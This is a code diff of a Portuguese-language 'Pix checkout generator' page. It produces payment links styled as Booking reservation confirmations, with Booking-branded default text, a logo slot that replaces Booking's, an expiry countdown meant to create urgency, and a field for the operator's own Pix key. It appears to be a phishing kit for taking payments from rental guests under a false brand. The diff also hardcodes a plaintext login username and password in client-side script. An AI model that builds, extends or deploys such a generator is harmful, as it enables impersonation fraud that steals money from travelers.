@@ -32,7 +32,11 @@ textarea{min-height:70px;resize:vertical;font-family:monospace;font-size:12px;}
 .btn-open{background:#32BCAD;color:#fff;border:none;}
 .toast{font-size:13px;color:#22c55e;margin-top:8px;display:none;text-align:center;}
 .spinner{display:none;text-align:center;padding:10px;color:#666;font-size:13px;}
-
+.color-row{display:flex;align-items:center;gap:8px;}
+.color-row input[type=color]{width:48px;height:38px;border:1px solid #ddd;border-radius:8px;cursor:pointer;padding:2px;flex-shrink:0;}
+.color-row input[type=text]{flex:1;}
+#btn-sair{position:fixed;top:12px;right:16px;background:#e24b4a;color:#fff;border:none;border-radius:8px;padding:8px 16px;font-size:13px;font-weight:700;cursor:pointer;z-index:999;display:none;}
+#btn-sair:hover{background:#c0392b;}
 #login-screen{position:fixed;inset:0;background:#1e40af;display:flex;align-items:center;justify-content:center;z-index:9999;}
 #login-box{background:#fff;border-radius:16px;padding:2.5rem 2rem;max-width:360px;width:90%;text-align:center;}
 #login-box h2{font-size:20px;font-weight:700;color:#1a3c6e;margin-bottom:8px;}
@@ -42,8 +46,6 @@ textarea{min-height:70px;resize:vertical;font-family:monospace;font-size:12px;}
 #login-btn{width:100%;background:#1a3c6e;color:#fff;border:none;border-radius:8px;padding:12px;font-size:15px;font-weight:700;cursor:pointer;}
 #login-btn:hover{background:#0f2a52;}
 #login-erro{color:#e24b4a;font-size:13px;margin-top:10px;display:none;}
-#btn-sair{position:fixed;top:12px;right:16px;background:#e24b4a;color:#fff;border:none;border-radius:8px;padding:8px 16px;font-size:13px;font-weight:700;cursor:pointer;z-index:999;display:none;}
-#btn-sair:hover{background:#c0392b;}
 </style>
 </head>
 <body>
@@ -58,24 +60,29 @@ textarea{min-height:70px;resize:vertical;font-family:monospace;font-size:12px;}
     <div id="login-erro">Usuário ou senha incorretos.</div>
   </div>
 </div>
+
 <button id="btn-sair" onclick="sair()">Sair</button>
+
 <div class="wrap">
   <h1>Gerador de checkout Pix</h1>
-
   <div class="card">
+
     <div class="row2">
       <div class="field"><label class="lbl">Texto da barra superior</label><input type="text" id="label-timer" value="Reserva expira em:"></div>
-      <div class="field"><label class="lbl">Tempo (minutos)</label><input type="number" id="minutos" value="15" min="1" max="180"></div>
+      <div class="field"><label class="lbl">Tempo (minutos)</label><input type="text" id="minutos" value="15"></div>
     </div>
+
     <div class="field"><label class="lbl">Frase abaixo da barra</label><input type="text" id="frase" placeholder="Você está ativando sua reserva na Booking"></div>
     <div class="field"><label class="lbl">Subtítulo da caixa branca</label><input type="text" id="subtitulo" placeholder="Efetivação de Reserva"></div>
+
     <div class="row2">
       <div class="field"><label class="lbl">Nome/marca</label><input type="text" id="marca" placeholder="Nome do hóspede"></div>
       <div class="field"><label class="lbl">Descrição do pedido</label><input type="text" id="desc" placeholder="Nome da casa"></div>
     </div>
+
     <div class="row2">
       <div class="field"><label class="lbl">Valor (R$)</label><input type="text" id="valor" placeholder="Ex: 1.000,00" oninput="formatarValor(this)"></div>
-      <div class="field"><label class="lbl">Logo (da sua galeria)</label>
+      <div class="field"><label class="lbl">Logo da propriedade</label>
         <div class="upload-area">
           <input type="file" accept="image/*" onchange="carregarLogo(event)">
           <img id="logo-prev" class="upload-preview">
@@ -83,33 +90,34 @@ textarea{min-height:70px;resize:vertical;font-family:monospace;font-size:12px;}
         </div>
       </div>
     </div>
-    <div class="field">
-  <label class="lbl">Logo do topo (substitui o Booking)</label>
-  <div class="upload-area">
-    <input type="file" accept="image/*" onchange="carregarLogoTopo(event)">
-    <img id="logo-topo-prev" class="upload-preview">
-    <p class="upload-text" id="upload-topo-text">📁 Clique para escolher</p>
-  </div>
-</div>
 
-<div class="row2">
-  <div class="field">
-    <label class="lbl">Cor do fundo</label>
-    <div style="display:flex;align-items:center;gap:8px;">
-      <input type="color" id="cor-fundo" value="#1e40af" style="width:48px;height:38px;border:1px solid #ddd;border-radius:8px;cursor:pointer;padding:2px;">
-      <input type="text" id="cor-fundo-hex" value="#1e40af" style="flex:1;" oninput="document.getElementById('cor-fundo').value=this.value">
+    <div class="field"><label class="lbl">Logo do topo (substitui o Booking)</label>
+      <div class="upload-area">
+        <input type="file" accept="image/*" onchange="carregarLogoTopo(event)">
+        <img id="logo-topo-prev" class="upload-preview">
+        <p class="upload-text" id="upload-topo-text">📁 Clique para escolher</p>
+      </div>
     </div>
-  </div>
-  <div class="field">
-    <label class="lbl">Cor da barra superior</label>
-    <div style="display:flex;align-items:center;gap:8px;">
-      <input type="color" id="cor-barra" value="#1a3580" style="width:48px;height:38px;border:1px solid #ddd;border-radius:8px;cursor:pointer;padding:2px;">
-      <input type="text" id="cor-barra-hex" value="#1a3580" style="flex:1;" oninput="document.getElementById('cor-barra').value=this.value">
-    </div>
-  </div>
-</div>
 
-<div class="field"><label class="lbl">Chave pix copia e cola</label><textarea id="chave" placeholder="Cole aqui a chave pix copia e cola completa..."></textarea></div>
+    <div class="row2">
+      <div class="field">
+        <label class="lbl">Cor do fundo</label>
+        <div class="color-row">
+          <input type="color" id="cor-fundo" value="#1e40af" oninput="document.getElementById('cor-fundo-hex').value=this.value">
+          <input type="text" id="cor-fundo-hex" value="#1e40af" oninput="document.getElementById('cor-fundo').value=this.value">
+        </div>
+      </div>
+      <div class="field">
+        <label class="lbl">Cor da barra superior</label>
+        <div class="color-row">
+          <input type="color" id="cor-barra" value="#1a3580" oninput="document.getElementById('cor-barra-hex').value=this.value">
+          <input type="text" id="cor-barra-hex" value="#1a3580" oninput="document.getElementById('cor-barra').value=this.value">
+        </div>
+      </div>
+    </div>
+
+    <div class="field"><label class="lbl">Chave pix copia e cola</label><textarea id="chave" placeholder="Cole aqui a chave pix copia e cola completa..."></textarea></div>
+
     <button class="btn-main" id="btn-gerar" onclick="gerar()">🔗 Gerar link de pagamento</button>
   </div>
 
@@ -130,31 +138,36 @@ textarea{min-height:70px;resize:vertical;font-family:monospace;font-size:12px;}
 let logoBase64 = '';
 let logoTopoBase64 = '';
 
-function carregarLogoTopo(e) {
-  const file = e.target.files[0];
-  if (!file) return;
-  const reader = new FileReader();
-  reader.onload = (ev) => {
-    const imgEl = new Image();
-    imgEl.onload = () => {
-      const canvas = document.createElement('canvas');
-      const MAX = 200;
-      let w = imgEl.width, h = imgEl.height;
-      if (w > h) { if (w > MAX) { h = h * MAX / w; w = MAX; } }
-      else { if (h > MAX) { w = w * MAX / h; h = MAX; } }
-      canvas.width = w; canvas.height = h;
-      canvas.getContext('2d').drawImage(imgEl, 0, 0, w, h);
-      logoTopoBase64 = canvas.toDataURL('image/jpeg', 0.85);
-      const prev = document.getElementById('logo-topo-prev');
-      prev.src = logoTopoBase64;
-      prev.style.display = 'block';
-      document.getElementById('upload-topo-text').textContent = file.name;
-    };
-    imgEl.src = ev.target.result;
+// LOGIN
+(function(){
+  var USER = 'Thiago';
+  var PASS = 'Bin1laden02111984';
+  if(sessionStorage.getItem('logado') === '1'){
+    document.getElementById('login-screen').style.display = 'none';
+    document.getElementById('btn-sair').style.display = 'block';
+  }
+  window.sair = function(){ sessionStorage.removeItem('logado'); location.reload(); };
+  window.fazerLogin = function(){
+    var u = document.getElementById('login-user').value.trim();
+    var p = document.getElementById('login-pass').value;
+    if(u === USER && p === PASS){
+      sessionStorage.setItem('logado','1');
+      document.getElementById('login-screen').style.display = 'none';
+      document.getElementById('btn-sair').style.display = 'block';
+    } else {
+      document.getElementById('login-erro').style.display = 'block';
+    }
   };
-  reader.readAsDataURL(file);
+})();
+
+function formatarValor(input) {
+  var v = input.value.replace(/\D/g, '');
+  if (!v) { input.value = ''; return; }
+  v = (parseInt(v, 10) / 100).toFixed(2);
+  v = v.replace('.', ',');
+  v = v.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+  input.value = v;
 }
-let linkFinal = '';
 
 function carregarLogo(e) {
   const file = e.target.files[0];
@@ -172,9 +185,32 @@ function carregarLogo(e) {
       canvas.getContext('2d').drawImage(imgEl, 0, 0, w, h);
       logoBase64 = canvas.toDataURL('image/jpeg', 0.85);
       const prev = document.getElementById('logo-prev');
-      prev.src = logoBase64;
-      prev.style.display = 'block';
+      prev.src = logoBase64; prev.style.display = 'block';
       document.getElementById('upload-text').textContent = file.name;
+    };
+    imgEl.src = ev.target.result;
+  };
+  reader.readAsDataURL(file);
+}
+
+function carregarLogoTopo(e) {
+  const file = e.target.files[0];
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = (ev) => {
+    const imgEl = new Image();
+    imgEl.onload = () => {
+      const canvas = document.createElement('canvas');
+      const MAX = 200;
+      let w = imgEl.width, h = imgEl.height;
+      if (w > h) { if (w > MAX) { h = h * MAX / w; w = MAX; } }
+      else { if (h > MAX) { w = w * MAX / h; h = MAX; } }
+      canvas.width = w; canvas.height = h;
+      canvas.getContext('2d').drawImage(imgEl, 0, 0, w, h);
+      logoTopoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+      const prev = document.getElementById('logo-topo-prev');
+      prev.src = logoTopoBase64; prev.style.display = 'block';
+      document.getElementById('upload-topo-text').textContent = file.name;
     };
     imgEl.src = ev.target.result;
   };
@@ -184,23 +220,23 @@ function carregarLogo(e) {
 async function gerar() {
   const chave = document.getElementById('chave').value.trim();
   if (!chave) { alert('Cole a chave pix primeiro.'); return; }
-
   const dados = {
     chave,
-    marca:  document.getElementById('marca').value.trim() || 'Nome do hóspede',
-    desc:   document.getElementById('desc').value.trim() || 'Nome da casa',
-    valor:  (function(){ var v = document.getElementById('valor').value.trim().replace(/\./g,'').replace(',','.'); return parseFloat(v) || 0; })(),
-    frase:  document.getElementById('frase').value.trim() || 'Você está ativando sua reserva na Booking',
-    sub:    document.getElementById('subtitulo').value.trim() || 'Efetivação de Reserva',
-    lTimer: document.getElementById('label-timer').value.trim() || 'Reserva expira em:',
-    mins:   Math.max(1, parseInt(document.getElementById('minutos').value) || 15),
-    logo:   logoBase64
+    marca:    document.getElementById('marca').value.trim() || 'Nome do hóspede',
+    desc:     document.getElementById('desc').value.trim() || 'Nome da casa',
+    valor:    (function(){ var v = document.getElementById('valor').value.trim().replace(/\./g,'').replace(',','.'); return parseFloat(v) || 0; })(),
+    frase:    document.getElementById('frase').value.trim() || 'Você está ativando sua reserva na Booking',
+    sub:      document.getElementById('subtitulo').value.trim() || 'Efetivação de Reserva',
+    lTimer:   document.getElementById('label-timer').value.trim() || 'Reserva expira em:',
+    mins:     Math.max(1, parseInt(document.getElementById('minutos').value) || 15),
+    logo:     logoBase64,
+    logoTopo: logoTopoBase64,
+    corFundo: document.getElementById('cor-fundo').value || '#1e40af',
+    corBarra: document.getElementById('cor-barra').value || '#1a3580',
   };
-
   document.getElementById('btn-gerar').disabled = true;
   document.getElementById('spinner').style.display = 'block';
   document.getElementById('result').style.display = 'none';
-
   try {
     const res = await fetch('/api/gerar', {
       method: 'POST',
@@ -208,19 +244,21 @@ async function gerar() {
       body: JSON.stringify(dados)
     });
     const json = await res.json();
-    linkFinal = json.link;
-    document.getElementById('link-out').textContent = linkFinal;
-    document.getElementById('result').style.display = 'block';
-  } catch(e) {
-    alert('Erro ao gerar link. Tente novamente.');
-  }
-
+    if (json.link) {
+      const linkOut = document.getElementById('link-out');
+      linkOut.textContent = json.link;
+      document.getElementById('result').style.display = 'block';
+    } else {
+      alert('Erro: ' + (json.error || 'Tente novamente'));
+    }
+  } catch(e) { alert('Erro ao gerar link.'); }
   document.getElementById('btn-gerar').disabled = false;
   document.getElementById('spinner').style.display = 'none';
 }
 
 function copiar() {
-  navigator.clipboard.writeText(linkFinal).then(() => {
+  const link = document.getElementById('link-out').textContent;
+  navigator.clipboard.writeText(link).then(() => {
     const t = document.getElementById('toast');
     t.style.display = 'block';
     setTimeout(() => t.style.display = 'none', 2500);
@@ -228,41 +266,8 @@ function copiar() {
 }
 
 function abrirLink() {
-  window.open(linkFinal, '_blank');
+  window.open(document.getElementById('link-out').textContent, '_blank');
 }
-
-document.getElementById('cor-fundo').addEventListener('input', function(){ document.getElementById('cor-fundo-hex').value = this.value; });
-document.getElementById('cor-barra').addEventListener('input', function(){ document.getElementById('cor-barra-hex').value = this.value; });
-
-function formatarValor(input) {
-  var v = input.value.replace(/\D/g, '');
-  if (!v) { input.value = ''; return; }
-  v = (parseInt(v, 10) / 100).toFixed(2);
-  v = v.replace('.', ',');
-  v = v.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
-  input.value = v;
-}
-
-(function(){
-  var USER = 'Thiago';
-  var PASS = 'Bin1laden02111984';
-  if(sessionStorage.getItem('logado') === '1'){
-    document.getElementById('login-screen').style.display = 'none';
-      document.getElementById('btn-sair').style.display = 'block';
-  }
-  window.sair = function(){ sessionStorage.removeItem('logado'); location.reload(); };
-  window.fazerLogin = function(){
-    var u = document.getElementById('login-user').value.trim();
-    var p = document.getElementById('login-pass').value;
-    if(u === USER && p === PASS){
-      sessionStorage.setItem('logado','1');
-      document.getElementById('login-screen').style.display = 'none';
-      document.getElementById('btn-sair').style.display = 'block';
-    } else {
-      document.getElementById('login-erro').style.display = 'block';
-    }
-  };
-})();
 </script>
 </body>
 </html>
